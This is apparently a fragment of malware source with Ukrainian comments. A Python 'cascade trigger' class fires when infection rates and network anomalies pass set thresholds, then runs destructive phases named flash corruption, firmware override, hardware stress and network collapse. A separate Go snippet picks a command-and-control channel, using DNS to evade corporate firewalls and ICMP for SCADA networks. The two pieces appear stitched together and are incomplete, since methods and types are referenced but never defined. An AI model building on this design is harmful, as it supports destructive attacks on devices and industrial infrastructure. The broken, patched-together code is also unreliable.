# cascade_trigger.py - система активації каскаду
class CascadeTrigger:
    def __init__(self):
        self.thresholds = {
            'device_infection': 0.65,  # 65% заражених пристроїв
            'network_saturation': 0.80,  # 80% навантаження мережі
            'time_elapsed': 604800,  # 7 днів
            'external_signal': False
        }
    
    def check_cascade_conditions(self, telemetry):
        """Перевірка умов для активації каскаду"""
        score = 0
        
        # Умова 1: достатнє поширення
        if telemetry['infected_devices'] / telemetry['total_devices'] > self.thresholds['device_infection']:
            score += 1
        
        # Умова 2: мережеві аномалії
        if telemetry['network_health'] < self.thresholds['network_saturation']:
            score += 1
        
        # Умова 3: зовнішній сигнал
        if self.check_external_signal():
            score += 2
        
        # Активація при score >= 2
        return score >= 2
    
    def execute_cascade(self):
        """Виконання каскадної помпи"""
        phases = [
            self.phase1_flash_corruption,
            self.phase2_firmware_override,
            self.phase3_hardware_stress,
            self.phase4_network_collapse
        ]
        
        for phase in phases:
            if not self.is_environment_safe():
                break
            phase()

package main

import (
    "context"
    "time"
    "math/rand"
)

type C2Channel struct {
    Priority    int
    Reliability float64
    Stealth     float64
    Bandwidth   int
}

func (c *C2Commander) SelectChannel(ctx context.Context) C2Channel {
    channels := []C2Channel{
        {Priority: 1, Reliability: 0.95, Stealth: 0.8, Bandwidth: 1000},  // DNS
        {Priority: 2, Reliability: 0.99, Stealth: 0.4, Bandwidth: 10000}, // HTTPS
        {Priority: 3, Reliability: 0.70, Stealth: 0.95, Bandwidth: 100},  // ICMP
    }
    
    // Адаптивний вибір на основі середовища
    if c.DetectedEnvironment == "corporate" {
        return channels[0]  // DNS для обходу корпоративних firewall
    } else if c.DetectedEnvironment == "industrial" {
        return channels[2]  // ICMP для SCADA-мереж
    }
    
    return channels[1]  // HTTPS за замовчуванням
}
